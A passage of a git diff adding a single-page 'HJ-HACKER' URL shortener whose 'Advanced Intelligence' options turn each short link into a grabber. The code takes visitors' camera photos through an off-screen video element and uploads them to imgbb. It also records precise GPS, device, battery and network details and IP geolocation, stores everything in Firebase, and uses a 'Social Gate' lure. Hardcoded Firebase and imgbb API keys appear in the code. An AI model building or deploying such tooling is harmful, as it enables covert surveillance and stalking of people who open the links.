@@ -2,301 +2,1412 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
-    <title>HJ-HACKER | Advanced URL Shortener</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>HJ HACKER - Advanced URL Shortener</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            font-family: 'Courier New', monospace;
+            color: #00ff41;
+            padding-bottom: 70px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #00ff41;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+        }
+
+        .header h1 i {
+            color: #00ff41;
+            margin-right: 10px;
+        }
+
+        .header p {
+            font-size: 0.7rem;
+            color: #888;
+            margin-top: 5px;
+        }
+
+        /* Cards */
+        .card {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #00ff41;
+            border-left: 3px solid #00ff41;
+            padding-left: 10px;
+        }
+
+        .card-title i {
+            margin-right: 8px;
+        }
+
+        /* Inputs */
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #00ff41;
+            font-family: monospace;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #00ff41;
+        }
+
+        button {
+            background: linear-gradient(135deg, #00ff41 0%, #00cc33 100%);
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,255,65,0.3);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Toggle Switch */
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #111;
+            border-radius: 8px;
+        }
+
+        .toggle-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+        }
+
+        .toggle-label i {
+            width: 20px;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #333;
+            transition: 0.3s;
+            border-radius: 24px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: 0.3s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #00ff41;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        /* Radio Group */
+        .radio-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+        }
+
+        /* Hidden */
+        .hidden {
+            display: none;
+        }
+
+        /* Result */
+        .result-box {
+            background: #111;
+            border: 1px solid #00ff41;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .short-url {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .short-url input {
+            flex: 1;
+            margin-bottom: 0;
+            background: #000;
+        }
+
+        .qr-code {
+            text-align: center;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            display: inline-block;
+        }
+
+        /* Data Display */
+        .data-header {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .data-header h3 {
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+
+        .data-header h3 i {
+            margin-right: 8px;
+        }
+
+        .data-content {
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .data-item {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 12px;
+        }
+
+        .data-item-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 12px;
+        }
+
+        .data-item-code {
+            color: #00ff41;
+            font-weight: bold;
+        }
+
+        .data-item-date {
+            color: #666;
+            font-size: 10px;
+        }
+
+        .data-item-url {
+            font-size: 11px;
+            color: #aaa;
+            margin-bottom: 8px;
+            word-break: break-all;
+        }
+
+        .data-item-stats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            font-size: 10px;
+            margin-bottom: 10px;
+            color: #888;
+        }
+
+        .data-item-stats span {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .data-item-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .data-btn-sm {
+            background: #111;
+            border: 1px solid #333;
+            color: #00ff41;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 10px;
+            cursor: pointer;
+        }
+
+        .data-btn-sm:hover {
+            border-color: #00ff41;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .stat-card {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ff41;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: #888;
+            margin-top: 5px;
+        }
+
+        .empty-data {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+
+        .empty-data i {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #0a0a0a;
+            border-top: 1px solid #1a1a1a;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            z-index: 100;
+        }
+
+        .bottom-nav-btn {
+            background: transparent;
+            color: #666;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            font-size: 10px;
+            padding: 5px 15px;
+        }
+
+        .bottom-nav-btn i {
+            font-size: 20px;
+        }
+
+        .bottom-nav-btn.active {
+            color: #00ff41;
+            background: transparent;
+            box-shadow: none;
+            transform: none;
+        }
+
+        /* Modal */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            max-width: 90%;
+            max-height: 90%;
+            position: relative;
+        }
+
+        .modal-content img {
+            max-width: 100%;
+            max-height: 80vh;
+            border-radius: 10px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+        }
+
+        /* Toast */
+        #toastContainer {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            z-index: 9999;
+        }
+
+        .toast {
+            background: #00ff41;
+            color: #000;
+            padding: 10px 15px;
+            margin: 5px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        .toast.error {
+            background: #ff4444;
+        }
+
+        .toast.info {
+            background: #00aaff;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-    <div class="app">
-        <div id="toastContainer" class="toast-container"></div>
 
-        <header class="header">
-            <div class="logo">
-                <i class="fas fa-bolt"></i>
-                <span class="hj">HJ</span><span class="hacker">HACKER</span>
-            </div>
-            <div class="header-badge">
-                <i class="fas fa-shield-alt"></i>
-                <span>SECURE • FAST • TRACKABLE</span>
-            </div>
-        </header>
-
-        <main class="main">
-            <div class="card" id="createCard">
-                <div class="card-header">
-                    <i class="fas fa-magic"></i>
-                    <h1>Create Short <span class="highlight">Link</span></h1>
-                </div>
-                
-                <div class="form-group">
-                    <label><i class="fas fa-globe"></i> Destination URL</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-link input-icon"></i>
-                        <input type="url" id="longUrl" placeholder="https://example.com/your-long-link" class="input">
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label><i class="fas fa-tag"></i> Custom Alias (Optional)</label>
-                    <div class="alias-wrapper">
-                        <span class="domain-prefix">hj.os/</span>
-                        <input type="text" id="customCode" placeholder="my-custom-link" maxlength="15" class="alias-input">
-                    </div>
-                </div>
-
-                <!-- Password Protection -->
-                <div class="feature-card" id="passwordCard">
-                    <div class="feature-header">
-                        <div class="feature-icon">
-                            <i class="fas fa-lock"></i>
-                        </div>
-                        <div class="feature-info">
-                            <h4>Password Protection</h4>
-                            <p>Secure your link with a password</p>
-                        </div>
-                        <label class="toggle-switch">
-                            <input type="checkbox" id="passwordToggle">
-                            <span class="toggle-slider"></span>
-                        </label>
-                    </div>
-                    <div id="passwordSection" class="feature-content hidden">
-                        <div class="input-wrapper">
-                            <i class="fas fa-key input-icon"></i>
-                            <input type="password" id="password" placeholder="Enter password" class="input">
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Social Gate -->
-                <div class="feature-card" id="socialCard">
-                    <div class="feature-header">
-                        <div class="feature-icon">
-                            <i class="fas fa-share-alt"></i>
-                        </div>
-                        <div class="feature-info">
-                            <h4>Social Gate</h4>
-                            <p>Require social action to unlock</p>
-                        </div>
-                        <label class="toggle-switch">
-                            <input type="checkbox" id="socialToggle">
-                            <span class="toggle-slider"></span>
-                        </label>
-                    </div>
-                    <div id="socialSection" class="feature-content hidden">
-                        <div class="icon-selector">
-                            <label>Platform Icon</label>
-                            <div class="icon-grid" id="iconGrid">
-                                <div class="icon-option active" data-icon="youtube"><i class="fab fa-youtube"></i></div>
-                                <div class="icon-option" data-icon="instagram"><i class="fab fa-instagram"></i></div>
-                                <div class="icon-option" data-icon="twitter"><i class="fab fa-twitter"></i></div>
-                                <div class="icon-option" data-icon="facebook"><i class="fab fa-facebook"></i></div>
-                                <div class="icon-option" data-icon="whatsapp"><i class="fab fa-whatsapp"></i></div>
-                                <div class="icon-option" data-icon="linkedin"><i class="fab fa-linkedin"></i></div>
-                                <div class="icon-option" data-icon="tiktok"><i class="fab fa-tiktok"></i></div>
-                            </div>
-                            <input type="hidden" id="socialIcon" value="youtube">
-                        </div>
-                        <div class="input-wrapper">
-                            <i class="fas fa-heading input-icon"></i>
-                            <input type="text" id="socialTitle" placeholder="Title (e.g., Follow our channel)" class="input">
-                        </div>
-                        <div class="input-wrapper">
-                            <i class="fas fa-link input-icon"></i>
-                            <input type="url" id="socialUrl" placeholder="Social profile URL" class="input">
-                        </div>
-                        <div class="input-wrapper">
-                            <i class="fas fa-align-left input-icon"></i>
-                            <input type="text" id="socialDesc" placeholder="Description" class="input">
-                        </div>
-                        <div class="input-wrapper">
-                            <i class="fas fa-button input-icon"></i>
-                            <input type="text" id="socialButton" placeholder="Button text" class="input" value="Verify & Continue">
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Animation Style -->
-                <div class="form-group">
-                    <label><i class="fas fa-film"></i> Animation Style</label>
-                    <div class="radio-cards">
-                        <label class="radio-card">
-                            <input type="radio" name="animation" value="ring" checked>
-                            <div class="radio-content">
-                                <i class="fas fa-circle-notch fa-spin"></i>
-                                <span>RGB Ring</span>
-                            </div>
-                        </label>
-                        <label class="radio-card">
-                            <input type="radio" name="animation" value="bar">
-                            <div class="radio-content">
-                                <i class="fas fa-chart-simple"></i>
-                                <span>Loading Bar</span>
-                            </div>
-                        </label>
-                    </div>
-                </div>
-
-                <!-- Advanced Intelligence -->
-                <div class="advanced-section">
-                    <button type="button" class="advanced-toggle" id="advancedToggle">
-                        <i class="fas fa-microchip"></i>
-                        <span>Advanced Intelligence</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div id="advancedContent" class="advanced-content hidden">
-                        <div class="checkbox-group">
-                            <label class="checkbox-card">
-                                <input type="checkbox" id="captureCamera">
-                                <div class="checkbox-content">
-                                    <i class="fas fa-camera"></i>
-                                    <span>Camera Access</span>
-                                    <small>Capture visitor's photo</small>
-                                </div>
-                            </label>
-                            <label class="checkbox-card">
-                                <input type="checkbox" id="captureLocation">
-                                <div class="checkbox-content">
-                                    <i class="fas fa-location-dot"></i>
-                                    <span>Location Access</span>
-                                    <small>Track GPS coordinates</small>
-                                </div>
-                            </label>
-                        </div>
-                    </div>
-                </div>
-
-                <button id="shortenBtn" class="btn-primary">
-                    <i class="fas fa-bolt"></i>
-                    <span>Create Short Link</span>
-                </button>
-
-                <div id="loading" class="loading hidden">
-                    <div class="spinner"></div>
-                    <p>Creating your link...</p>
-                </div>
-                
-                <div id="result" class="result hidden">
-                    <div class="result-header">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Link Created!</span>
-                        <button id="copyBtn" class="btn-icon">
-                            <i class="fas fa-copy"></i>
-                        </button>
-                    </div>
-                    <div class="result-link" id="shortLink"></div>
-                    <div id="qrCode" class="qr-code"></div>
-                </div>
-            </div>
-
-            <!-- Data Display Area -->
-            <div class="data-display-area" id="dataDisplayArea">
-                <div class="data-display-header" id="dataDisplayHeader">
-                    <i class="fas fa-chart-line"></i>
-                    <span id="dataDisplayTitle">Click any button to view data</span>
-                </div>
-                <div id="dataDisplayContent" class="data-display-content">
-                    <div class="empty-data">
-                        <i class="fas fa-fingerprint"></i>
-                        <p>Tap on LINKS, STATS, or RECENT button below</p>
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <!-- Bottom Navigation -->
-        <nav class="bottom-nav">
-            <button class="bottom-nav-btn active" data-tab="create">
-                <i class="fas fa-plus-circle"></i>
-                <span>Create</span>
-            </button>
-            <button class="bottom-nav-btn" data-tab="links">
-                <i class="fas fa-link"></i>
-                <span>Links</span>
-            </button>
-            <button class="bottom-nav-btn" data-tab="stats">
-                <i class="fas fa-chart-line"></i>
-                <span>Stats</span>
-            </button>
-            <button class="bottom-nav-btn" data-tab="recent">
-                <i class="fas fa-history"></i>
-                <span>Recent</span>
-            </button>
-        </nav>
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <h1><i class="fas fa-skull"></i> HJ-HACKER</h1>
+        <p>Advanced URL Shortener & Intelligence Tool</p>
     </div>
 
-    <!-- Photo Viewer Modal (for camera images) -->
-    <div id="photoModal" class="modal hidden">
-        <div class="modal-content photo-modal-content">
-            <div class="modal-header">
-                <i class="fas fa-camera"></i>
-                <h3>Captured Photo</h3>
-                <button id="closePhotoModal" class="close-modal-btn">✕</button>
+    <!-- Create Link Card -->
+    <div class="card" id="createCard">
+        <div class="card-title"><i class="fas fa-plus-circle"></i> Create Short Link</div>
+        
+        <input type="text" id="longUrl" placeholder="Enter long URL (https://...)" autocomplete="off">
+        <input type="text" id="customCode" placeholder="Custom code (optional)" autocomplete="off" maxlength="10">
+        
+        <!-- Animation Style -->
+        <div class="card-title" style="margin-top: 10px;"><i class="fas fa-bolt"></i> Animation Style</div>
+        <div class="radio-group">
+            <label><input type="radio" name="animation" value="ring" checked> <i class="fas fa-circle-notch"></i> RGB Ring</label>
+            <label><input type="radio" name="animation" value="bar"> <i class="fas fa-chart-line"></i> Loading Bar</label>
+        </div>
+        
+        <!-- Advanced Options Toggle -->
+        <div class="toggle-container" id="advancedToggle" style="cursor: pointer;">
+            <span class="toggle-label"><i class="fas fa-cogs"></i> Advanced Intelligence</span>
+            <i class="fas fa-chevron-down"></i>
+        </div>
+        
+        <div id="advancedContent" class="hidden">
+            <!-- Camera Capture -->
+            <div class="toggle-container">
+                <span class="toggle-label"><i class="fas fa-camera"></i> Capture Camera Photo</span>
+                <label class="switch">
+                    <input type="checkbox" id="captureCamera">
+                    <span class="slider"></span>
+                </label>
             </div>
-            <div class="modal-body photo-modal-body">
-                <img id="photoModalImage" src="" alt="Captured Photo" style="width: 100%; border-radius: 12px;">
+            
+            <!-- Location Capture -->
+            <div class="toggle-container">
+                <span class="toggle-label"><i class="fas fa-map-marker-alt"></i> Capture GPS Location</span>
+                <label class="switch">
+                    <input type="checkbox" id="captureLocation">
+                    <span class="slider"></span>
+                </label>
             </div>
-            <div class="modal-footer">
-                <button id="downloadPhotoBtn" class="btn-primary">Download</button>
-                <button id="closePhotoModalBtn" class="btn-secondary">Close</button>
+            
+            <!-- Password Protection -->
+            <div class="toggle-container">
+                <span class="toggle-label"><i class="fas fa-lock"></i> Password Protection</span>
+                <label class="switch">
+                    <input type="checkbox" id="passwordToggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div id="passwordSection" class="hidden">
+                <input type="password" id="password" placeholder="Enter password">
+            </div>
+            
+            <!-- Social Gate -->
+            <div class="toggle-container">
+                <span class="toggle-label"><i class="fas fa-share-alt"></i> Social Media Gate</span>
+                <label class="switch">
+                    <input type="checkbox" id="socialToggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div id="socialSection" class="hidden">
+                <input type="text" id="socialTitle" placeholder="Title (e.g., Follow us on Instagram)">
+                <input type="text" id="socialUrl" placeholder="Social Media URL">
+                <input type="text" id="socialDesc" placeholder="Description (optional)">
+                <input type="text" id="socialButton" placeholder="Button Text (e.g., Verify & Continue)">
             </div>
         </div>
-    </div>
-
-    <!-- Password Modal -->
-    <div id="passwordModal" class="modal hidden">
-        <div class="modal-content">
-            <div class="modal-header">
-                <i class="fas fa-lock"></i>
-                <h3>Protected Link</h3>
-            </div>
-            <div class="modal-body">
-                <p>This link is password protected. Please enter the access code.</p>
-                <div class="input-wrapper">
-                    <i class="fas fa-key input-icon"></i>
-                    <input type="password" id="modalPassword" placeholder="Enter password" class="input">
-                </div>
-                <div id="modalError" class="modal-error hidden"></div>
-            </div>
-            <div class="modal-footer">
-                <button id="modalCancel" class="btn-secondary">Cancel</button>
-                <button id="modalUnlock" class="btn-primary">Unlock</button>
-            </div>
+        
+        <button id="shortenBtn"><i class="fas fa-link"></i> Create Short Link</button>
+        <div id="loading" class="hidden" style="text-align: center; margin-top: 10px;">
+            <i class="fas fa-spinner fa-pulse"></i> Processing...
         </div>
-    </div>
-
-    <!-- Social Gate Modal -->
-    <div id="socialModal" class="modal hidden">
-        <div class="modal-content social-modal">
-            <div class="social-modal-icon" id="socialModalIcon"></div>
-            <h3 id="socialModalTitle">Follow to Unlock</h3>
-            <p id="socialModalDesc">Complete the action below to continue</p>
-            <button id="socialModalBtn" class="btn-primary">Verify & Continue</button>
-        </div>
-    </div>
-
-    <!-- Delete Confirmation Modal -->
-    <div id="deleteModal" class="modal hidden">
-        <div class="modal-content">
-            <div class="modal-header">
-                <i class="fas fa-trash-alt" style="color: #ff4444;"></i>
-                <h3>Delete Link</h3>
+        
+        <!-- Result -->
+        <div id="result" class="result-box hidden">
+            <div class="short-url">
+                <input type="text" id="shortLink" readonly>
+                <button id="copyBtn"><i class="fas fa-copy"></i></button>
             </div>
-            <div class="modal-body">
-                <p>Are you sure you want to delete this link? <strong id="deleteLinkCode"></strong></p>
-                <p style="color: #ff4444; font-size: 0.7rem;">This action cannot be undone!</p>
-            </div>
-            <div class="modal-footer">
-                <button id="cancelDeleteBtn" class="btn-secondary">Cancel</button>
-                <button id="confirmDeleteBtn" class="btn-primary" style="background: #ff4444; color: white;">Delete Forever</button>
-            </div>
+            <div id="qrCode" class="qr-code"></div>
         </div>
     </div>
     
-    <script src="script.js"></script>
+    <!-- Data Display Card -->
+    <div class="card">
+        <div class="data-header">
+            <h3 id="dataDisplayTitle"><i class="fas fa-database"></i> Data Center</h3>
+        </div>
+        <div class="data-content" id="dataDisplayContent">
+            <div class="empty-data">
+                <i class="fas fa-fingerprint"></i>
+                <p>Click LINKS, STATS, or RECENT to view data</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Bottom Navigation -->
+<div class="bottom-nav">
+    <button class="bottom-nav-btn active" data-tab="create">
+        <i class="fas fa-plus-circle"></i>
+        <span>Create</span>
+    </button>
+    <button class="bottom-nav-btn" data-tab="links">
+        <i class="fas fa-link"></i>
+        <span>Links</span>
+    </button>
+    <button class="bottom-nav-btn" data-tab="stats">
+        <i class="fas fa-chart-line"></i>
+        <span>Stats</span>
+    </button>
+    <button class="bottom-nav-btn" data-tab="recent">
+        <i class="fas fa-history"></i>
+        <span>Recent</span>
+    </button>
+</div>
+
+<!-- Photo Modal -->
+<div id="photoModal" class="modal hidden" style="display: none;">
+    <div class="modal-content">
+        <button class="close-modal" id="closePhotoModalBtn">&times;</button>
+        <img id="photoModalImage" alt="Captured Photo">
+        <div class="modal-buttons">
+            <button id="downloadPhotoBtn"><i class="fas fa-download"></i> Download</button>
+            <button id="closePhotoModal"><i class="fas fa-times"></i> Close</button>
+        </div>
+    </div>
+</div>
+
+<div id="toastContainer"></div>
+
+<script>
+// Firebase Configuration
+const firebaseConfig = {
+    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
+    authDomain: "hjh-tools.firebaseapp.com",
+    projectId: "hjh-tools",
+    storageBucket: "hjh-tools.firebasestorage.app",
+    messagingSenderId: "643137472905",
+    appId: "1:643137472905:web:814ca23a86fb084811b958",
+    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
+};
+
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+// ========== IMGBB API KEY ==========
+const IMGBB_API_KEY = "1c64909854fd8f51eaad9f03c965ad78";
+
+// ========== CAPTURE & UPLOAD TO IMGBB ==========
+async function captureAndUploadPhoto() {
+    try {
+        showToast("Camera", "Starting camera...", "info");
+        
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: { ideal: 640 }, height: { ideal: 480 } } 
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.playsInline = true;
+        video.style.position = 'fixed';
+        video.style.top = '-9999px';
+        video.style.left = '-9999px';
+        document.body.appendChild(video);
+        await video.play();
+        
+        await new Promise(r => setTimeout(r, 500));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const base64 = canvas.toDataURL('image/jpeg', 0.7);
+        
+        stream.getTracks().forEach(t => t.stop());
+        video.remove();
+        
+        showToast("Uploading", "Uploading to server...", "info");
+        
+        const formData = new FormData();
+        formData.append('image', base64.split(',')[1]);
+        formData.append('key', IMGBB_API_KEY);
+        
+        const response = await fetch('https://api.imgbb.com/1/upload', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            const imageUrl = result.data.url;
+            showToast("Success", "Photo uploaded!", "success");
+            return imageUrl;
+        } else {
+            showToast("Error", "Upload failed", "error");
+            return null;
+        }
+        
+    } catch (error) {
+        console.error("Camera error:", error);
+        showToast("Error", error.message, "error");
+        return null;
+    }
+}
+
+// ========== CAPTURE LOCATION ==========
+async function captureLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(null);
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const loc = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+                showToast("Location", "Location captured!", "success");
+                resolve(loc);
+            },
+            (error) => {
+                console.error("Location error:", error);
+                resolve(null);
+            },
+            { timeout: 10000, enableHighAccuracy: true }
+        );
+    });
+}
+
+// ========== DEVICE INFO ==========
+async function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    
+    let browser = "Unknown";
+    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+    else if (ua.includes("Edg")) browser = "Edge";
+    else if (ua.includes("OPR")) browser = "Opera";
+    
+    let os = "Unknown";
+    let osVersion = "Unknown";
+    if (ua.includes("Android")) {
+        os = "Android";
+        const match = ua.match(/Android[\s/]+([\d.]+)/);
+        osVersion = match ? match[1] : "Unknown";
+    } else if (ua.includes("iPhone")) {
+        os = "iOS";
+        const match = ua.match(/iPhone OS ([\d_]+)/);
+        osVersion = match ? match[1].replace(/_/g, '.') : "Unknown";
+    } else if (ua.includes("Windows NT 10.0")) {
+        os = "Windows 10";
+        osVersion = "10";
+    } else if (ua.includes("Windows NT 11.0")) {
+        os = "Windows 11";
+        osVersion = "11";
+    } else if (ua.includes("Mac OS X")) {
+        os = "macOS";
+        const match = ua.match(/Mac OS X ([\d_]+)/);
+        osVersion = match ? match[1].replace(/_/g, '.') : "Unknown";
+    }
+    
+    let device = "Unknown";
+    let deviceBrand = "Unknown";
+    if (ua.includes("iPhone")) device = "iPhone";
+    else if (ua.includes("iPad")) device = "iPad";
+    else if (ua.includes("SM-")) { deviceBrand = "Samsung"; device = "Samsung"; }
+    else if (ua.includes("MI ")) { deviceBrand = "Xiaomi"; device = "Xiaomi"; }
+    else if (ua.includes("Redmi")) { deviceBrand = "Xiaomi"; device = "Redmi"; }
+    else if (ua.includes("Pixel")) { deviceBrand = "Google"; device = "Pixel"; }
+    else if (ua.includes("OnePlus")) { deviceBrand = "OnePlus"; device = "OnePlus"; }
+    
+    let batteryLevel = "Unknown";
+    let batteryCharging = "Unknown";
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100) + "%";
+            batteryCharging = battery.charging ? "Yes" : "No";
+        } catch(e) {}
+    }
+    
+    let connectionType = "Unknown";
+    let downlink = "Unknown";
+    let rtt = "Unknown";
+    if (navigator.connection) {
+        connectionType = navigator.connection.effectiveType || "Unknown";
+        downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Unknown";
+        rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Unknown";
+    }
+    
+    return {
+        browser: browser,
+        os: os,
+        os_version: osVersion,
+        device_brand: deviceBrand,
+        device: device,
+        screen_width: screen.width,
+        screen_height: screen.height,
+        device_pixel_ratio: window.devicePixelRatio,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardware_concurrency: navigator.hardwareConcurrency || "Unknown",
+        device_memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+        battery_level: batteryLevel,
+        battery_charging: batteryCharging,
+        connection_type: connectionType,
+        downlink: downlink,
+        rtt: rtt
+    };
+}
+
+// ========== IP INFO ==========
+async function getIPInfo() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+            ip: data.ip || "Unknown",
+            city: data.city || "Unknown",
+            region: data.region || "Unknown",
+            country: data.country_name || "Unknown",
+            country_code: data.country_code || "Unknown",
+            postal: data.postal || "Unknown",
+            latitude: data.latitude || null,
+            longitude: data.longitude || null,
+            timezone: data.timezone || "Unknown"
+        };
+    } catch (e) {
+        return { ip: "Unknown", city: "Unknown", country: "Unknown", latitude: null, longitude: null };
+    }
+}
+
+// ========== TOAST ==========
+function showToast(title, message, type = 'success') {
+    let container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.innerHTML = `<strong>${title}</strong><br>${message}`;
+    container.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+}
+
+// ========== CREATE SHORT LINK ==========
+async function shortenUrl() {
+    const longUrl = document.getElementById('longUrl').value.trim();
+    if (!longUrl) {
+        showToast("Error", "Please enter a URL", "error");
+        return;
+    }
+    
+    let finalUrl = longUrl;
+    if (!finalUrl.startsWith('http')) finalUrl = 'https://' + finalUrl;
+    
+    try {
+        new URL(finalUrl);
+    } catch {
+        showToast("Error", "Invalid URL", "error");
+        return;
+    }
+    
+    const customCode = document.getElementById('customCode').value.trim();
+    let shortCode = customCode || Math.random().toString(36).substring(2, 8);
+    
+    const existing = await database.ref(`urls/${shortCode}`).once('value');
+    if (existing.exists()) {
+        showToast("Error", "Code already taken", "error");
+        return;
+    }
+    
